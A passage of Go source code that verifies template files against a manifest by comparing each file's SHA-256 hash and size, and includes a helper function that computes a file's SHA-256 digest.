		sum, err := fileSHA256(path)
		if err != nil {
			tf.Error = err.Error()
			all = false
		} else if sum != f.SHA256 || st.Size() != f.Size {
			tf.Error = "hash/size mismatch"
			all = false
		} else {
			tf.Match = true
		}
		set.Files = append(set.Files, tf)
	}
	set.OK = all && len(mf.Files) > 0
	if !set.OK && set.Error == "" {
		set.Error = "template files changed since the manifest was written"
	}
	return set
}

func fileSHA256(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}
